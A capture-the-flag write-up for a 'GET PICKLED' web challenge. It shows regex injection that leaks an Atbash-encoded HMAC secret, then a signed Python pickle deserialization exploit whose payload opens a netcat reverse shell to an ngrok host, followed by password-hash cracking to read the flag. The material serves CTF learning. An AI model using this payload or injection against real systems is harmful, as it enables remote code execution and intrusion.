# GET PICKLED

On opening the website, We would be given some hints and a sample form.


The form says it returns a country along with its capital.

So, if we enter India as the country, we get the response:

```
Country India Capital New Delhi
```

By looking at the source code for the /form route we get this:
```
results += re.findall(r"^(?:Country\s)" + name+r"(?:\sCapital\s.*)",line, flags=key)
```
We get to know that the `name` variable is passed in the regular expression. Opening Postman or any other tool for sending requests, we try to send special characters in the `name` variable.

If we pass name as ".*" which is used to accept any strings and the key value as 0 which means it should be case sensitive, our regex would look like,

```
^(?:Country\s).*(?:\sCapital\s.*)
```

which would give the response:
```
Country India Capital New Delhi
Country USA Capital WashingtonDC
Country UK Capital London
Country France Capital Paris
Country Australia Capital Canberra
Country Austria Capital Vienna
Country Italy Capital Rome
Country Pakistan Capital Islamabad
Country Brazil Capital Brasília
Country Argetina Capital Buenos Aires
```
But if we change the `key` value to `2`, it ignores the case and returns all the contents of the file:
```
Country India Capital New Delhi
Country USA Capital WashingtonDC
Country UK Capital London
Country France Capital Paris
Country Australia Capital Canberra
Country Austria Capital Vienna
Country Italy Capital Rome
Country Pakistan Capital Islamabad
Country Brazil Capital Brasília
Country Argetina Capital Buenos Aires
country chall capital flag not here
country actualchall capital this is your secret (definitely not a cipher)
country blfisnzxhvxivgrh:wlmggifhgkrxpovh&svivrhblfiilfgvglvckolrg:gsvilfgvdsrxsnfhgmlgyvmznvw capital yougotit

```
We see this unique cipher text

```
blfisnzxhvxivgrh:wlmggifhgkrxpovh&svivrhblfiilfgvglvckolrg:gsvilfgvdsrxsnfhgmlgyvmznvw
```

Looking for cipher on cipher identifier such as [dcode](https://www.dcode.fr/cipher-identifier) we get to know that this is an Atbash Cipher and we get the below plaintext:

```
yourhmacsecretis:donttrustpickles&hereisyourroutetoexploit:theroutewhichmustnotbenamed
```
Hence, we get the hmac secret key for signing the pickled data and the route to perform the pickle deserialization.

RCE is possible with python's pickle module because during deserialization using the function `pickle.loads()` , the contents under the function `__reduce__` gets executed always, leading to arbitrary code execution.

However by just encoding the reverse shell command without signing it with hmac and sending it would give the error:

```
Integrity Check Failed, I think I have secured my server or have I?
```


So we have to use hmac library in python to sign the malicious pickle payload.

Looking at the source code, we can generate the below payload:

```
import base64
import os

import pickle
import hmac
import hashlib



class RCE:
    def __reduce__(self):
        cmd = ('nc 0.tcp.in.ngrok.io PORT_NO -e /bin/sh')
        return os.system, (cmd,)


pickled_data = pickle.dumps(RCE())
digest = hmac.new('donttrustpickles'.encode(), pickled_data, hashlib.sha1).hexdigest()
header = f"{digest} ".encode()
data = header + pickled_data
data_send= base64.urlsafe_b64encode(data)
print(data_send)
```

Start a ngrok proxy on a port say 1234 and add the ngrok proxy port number in the above exploit.

This would give a payload. Start a netcat listener on the same port 1234 and after sending the crafted payload to the route, we would get a shell.

After navigating through the directories, we can find the flag inside /pickle/ctf/is/very/fun/flag.txt

But it is avaialble only to the user `pickle`, whose password is hashed and stored in an image `ctf.jpeg` in our `app` folder. 
Running either `strings ctf.jpeg` or just `cat ctf.jpeg`, we would get the hashed password of pickle.

Cracking the hash using websites like [crackstation](https://crackstation.net/), we would get the pickle password as `regex`. 

Switching to `pickle` user, we can view the contents of `flag.txt`.

```
p_ctf{p1cKle_Is_v3ry_bAd}
```
